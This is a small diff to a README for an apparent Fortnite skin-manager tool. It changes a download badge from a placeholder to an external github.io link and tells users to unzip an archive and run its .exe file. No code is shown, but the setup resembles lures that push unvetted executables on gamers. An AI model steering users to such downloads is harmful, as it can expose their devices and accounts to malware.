@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://fortnite-skin-customization-tools.github.io/.github/)
 
 ## 📸 Overview
 ![fortnite-skin-manager](https://github.com/user-attachments/assets/889ebed2-67f0-46a8-8364-c6e68088d57d)
